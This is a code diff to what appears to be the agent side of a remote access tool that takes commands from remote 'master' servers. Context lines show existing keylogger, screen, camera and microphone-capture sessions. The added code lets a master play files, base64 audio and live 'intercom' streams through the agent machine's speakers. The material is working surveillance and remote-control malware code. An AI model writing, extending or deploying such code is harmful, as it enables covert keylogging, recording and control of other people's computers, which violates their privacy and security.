@@ -934,8 +934,12 @@ screen_sessions: dict[Any, dict] = {}
 camera_sessions: dict[Any, dict] = {}
 # Keylogger sessions per master connection
 keylog_sessions: dict[Any, Any] = {}
-# Audio sessions per master connection
+# Audio sessions per master connection (agent microphone capture)
 audio_sessions: dict[Any, dict] = {}
+# Playback sessions per master connection (agent speaker playback of files/data)
+playback_sessions: dict[Any, dict] = {}
+# Intercom (master -> agent live audio) sessions per master connection
+intercom_sessions: dict[Any, dict] = {}
 
 async def _connect_one_master(url: str):
     global command_running, queue_task, queue_current_proc, queue_started_at, command_queue, master_stop, master_urls
@@ -1159,6 +1163,254 @@ async def _connect_one_master(url: str):
                                 except Exception:
                                     pass
                             continue
+                        # --- Audio playback: play a file on agent speakers ---
+                        if isinstance(data, dict) and data.get("type") == "audio_play_path":
+                            try:
+                                p = str(data.get("path") or "").strip()
+                            except Exception:
+                                p = ""
+                            if not p:
+                                try:
+                                    await ws.send(json.dumps({"error": "[Audio] missing path\n"}))
+                                except Exception:
+                                    pass
+                                continue
+                            # Resolve relative path against current dir
+                            try:
+                                base = current_agent_dir
+                                full = p if os.path.isabs(p) else os.path.abspath(os.path.join(base, p))
+                            except Exception:
+                                full = p
+                            if not os.path.isfile(full):
+                                await _send_line(ws, "error", f"[Audio] file not found: {full}\n")
+                                continue
+                            if playback_sessions.get(ws, {}).get("running"):
+                                await _send_line(ws, "output", "[Audio] playback already running\n")
+                                continue
+                            async def _do_play_file(path: str):
+                                try:
+                                    await _send_line(ws, "output", f"[Audio] playing: {os.path.basename(path)}\n")
+                                    def _run():
+                                        try:
+                                            import soundfile as sf  # type: ignore
+                                            import sounddevice as sd  # type: ignore
+                                            import numpy as _np  # noqa
+                                            data_arr, rate = sf.read(path, dtype='int16')
+                                            if getattr(data_arr, 'ndim', 1) == 1:
+                                                ch = 1
+                                                data2 = data_arr.reshape((-1, 1))
+                                            else:
+                                                ch = int(data_arr.shape[1])
+                                                data2 = data_arr
+                                            with sd.OutputStream(samplerate=int(rate), channels=int(ch), dtype='int16') as stream:
+                                                idx = 0
+                                                block = 4096
+                                                n = len(data2)
+                                                while idx < n:
+                                                    end = min(n, idx + block)
+                                                    stream.write(data2[idx:end])
+                                                    idx = end
+                                        except Exception as e:
+                                            raise e
+                                    await asyncio.to_thread(_run)
+                                    await _send_line(ws, "output", "[Audio] playback finished\n")
+                                except Exception as e:
+                                    await _send_line(ws, "error", f"[Audio] play failed: {e}\n")
+                                finally:
+                                    try:
+                                        playback_sessions.pop(ws, None)
+                                    except Exception:
+                                        pass
+                            try:
+                                playback_sessions[ws] = {"running": True, "task": asyncio.create_task(_do_play_file(full))}
+                            except Exception:
+                                await _send_line(ws, "error", "[Audio] failed to start playback task\n")
+                            continue
+
+                        # --- Audio playback: play raw data/wav provided by master ---
+                        if isinstance(data, dict) and data.get("type") == "audio_play_data":
+                            s = str(data.get("data") or data.get("data_url") or data.get("b64") or "")
+                            if not s:
+                                await _send_line(ws, "error", "[Audio] missing data\n")
+                                continue
+                            if s.startswith('data:') and ';base64,' in s:
+                                try:
+                                    s = s.split(';base64,', 1)[1]
+                                except Exception:
+                                    pass
+                            try:
+                                raw = base64.b64decode(s, validate=False)
+                            except Exception as e:
+                                await _send_line(ws, "error", f"[Audio] decode failed: {e}\n")
+                                continue
+                            if playback_sessions.get(ws, {}).get("running"):
+                                await _send_line(ws, "output", "[Audio] playback already running\n")
+                                continue
+                            async def _do_play_bytes(b: bytes):
+                                try:
+                                    await _send_line(ws, "output", "[Audio] playing buffer\n")
+                                    def _run():
+                                        try:
+                                            import soundfile as sf  # type: ignore
+                                            import sounddevice as sd  # type: ignore
+                                            import numpy as _np  # noqa
+                                            buf = io.BytesIO(b)
+                                            data_arr, rate = sf.read(buf, dtype='int16')
+                                            if getattr(data_arr, 'ndim', 1) == 1:
+                                                ch = 1
+                                                data2 = data_arr.reshape((-1, 1))
+                                            else:
+                                                ch = int(data_arr.shape[1])
+                                                data2 = data_arr
+                                            with sd.OutputStream(samplerate=int(rate), channels=int(ch), dtype='int16') as stream:
+                                                idx = 0
+                                                block = 4096
+                                                n = len(data2)
+                                                while idx < n:
+                                                    end = min(n, idx + block)
+                                                    stream.write(data2[idx:end])
+                                                    idx = end
+                                        except Exception as e:
+                                            raise e
+                                    await asyncio.to_thread(_run)
+                                    await _send_line(ws, "output", "[Audio] playback finished\n")
+                                except Exception as e:
+                                    await _send_line(ws, "error", f"[Audio] play failed: {e}\n")
+                                finally:
+                                    try:
+                                        playback_sessions.pop(ws, None)
+                                    except Exception:
+                                        pass
+                            try:
+                                playback_sessions[ws] = {"running": True, "task": asyncio.create_task(_do_play_bytes(raw))}
+                            except Exception:
+                                await _send_line(ws, "error", "[Audio] failed to start playback task\n")
+                            continue
+
+                        # --- Intercom (master -> agent live audio) ---
+                        if isinstance(data, dict) and data.get("type") == "intercom_start":
+                            try:
+                                rate = int(data.get("sample_rate") or data.get("rate") or AUDIO_SAMPLE_RATE)
+                            except Exception:
+                                rate = AUDIO_SAMPLE_RATE
+                            try:
+                                ch = 1 if int(data.get("channels") or 1) <= 1 else 2
+                            except Exception:
+                                ch = 1
+                            if ws in intercom_sessions and intercom_sessions[ws].get("running"):
+                                await _send_line(ws, "output", "[Intercom already running]\n")
+                                continue
+                            async def _open_stream_async():
+                                try:
+                                    import sounddevice as sd  # type: ignore
+                                    def _open():
+                                        stream = sd.OutputStream(samplerate=int(rate), channels=int(ch), dtype='int16')
+                                        stream.start()
+                                        return stream
+                                    stream = await asyncio.to_thread(_open)
+                                    intercom_sessions[ws] = {"running": True, "stream": stream, "rate": int(rate), "ch": int(ch), "mute": False, "lock": threading.Lock()}
+                                    await _send_line(ws, "output", f"[Intercom] started: {int(rate)} Hz, ch={int(ch)}\n")
+                                except Exception as e:
+                                    await _send_line(ws, "error", f"[Intercom] failed to start: {e}\n")
+                            await _open_stream_async()
+                            continue
+
+                        if isinstance(data, dict) and data.get("type") == "intercom_chunk":
+                            sess = intercom_sessions.get(ws)
+                            if not sess or not sess.get("running"):
+                                await _send_line(ws, "error", "[Intercom] not running\n")
+                                continue
+                            if bool(sess.get("mute")):
+                                # drop audio silently
+                                continue
+                            s = str(data.get("pcm_b64") or data.get("data") or data.get("data_url") or "")
+                            if not s:
+                                continue
+                            if s.startswith('data:') and ';base64,' in s:
+                                try:
+                                    s = s.split(';base64,', 1)[1]
+                                except Exception:
+                                    pass
+                            try:
+                                raw = base64.b64decode(s, validate=False)
+                            except Exception:
+                                continue
+                            rate = int(sess.get("rate") or AUDIO_SAMPLE_RATE)
+                            ch = int(sess.get("ch") or 1)
+                            stream = sess.get("stream")
+                            lock = sess.get("lock")
+                            # Try WAV decode first; fallback to raw int16 PCM
+                            arr = None
+                            try:
+                                import soundfile as sf  # type: ignore
+                                buf = io.BytesIO(raw)
+                                data_arr, _r = sf.read(buf, dtype='int16')
+                                if getattr(data_arr, 'ndim', 1) == 1:
+                                    arr = data_arr.reshape((-1, 1))
+                                else:
+                                    arr = data_arr
+                            except Exception:
+                                try:
+                                    arr = np.frombuffer(raw, dtype=np.int16)
+                                    if ch > 1:
+                                        arr = arr.reshape((-1, ch))
+                                    else:
+                                        arr = arr.reshape((-1, 1))
+                                except Exception:
+                                    arr = None
+                            if arr is None:
+                                continue
+                            def _write(a):
+                                try:
+                                    if lock: 
+                                        try:
+                                            lock.acquire()
+                                        except Exception:
+                                            pass
+                                    stream.write(a)
+                                finally:
+                                    try:
+                                        if lock:
+                                            lock.release()
+                                    except Exception:
+                                        pass
+                            try:
+                                await asyncio.to_thread(_write, arr)
+                            except Exception:
+                                pass
+                            continue
+
+                        if isinstance(data, dict) and data.get("type") == "intercom_mute":
+                            sess = intercom_sessions.get(ws)
+                            if not sess:
+                                continue
+                            try:
+                                m = bool(data.get("mute"))
+                            except Exception:
+                                m = True
+                            try:
+                                sess["mute"] = m
+                            except Exception:
+                                pass
+                            await _send_line(ws, "output", f"[Intercom] mute={'on' if m else 'off'}\n")
+                            continue
+
+                        if isinstance(data, dict) and data.get("type") == "intercom_stop":
+                            sess = intercom_sessions.pop(ws, None)
+                            if sess:
+                                try:
+                                    s = sess.get("stream")
+                                    def _close():
+                                        try:
+                                            s.stop(); s.close()
+                                        except Exception:
+                                            pass
+                                    await asyncio.to_thread(_close)
+                                except Exception:
+                                    pass
+                                await _send_line(ws, "output", "[Intercom] stopped\n")
+                            continue
+
                         if isinstance(data, dict) and data.get("type") == "masters_list":
                             try:
                                 urls = master_urls[:]
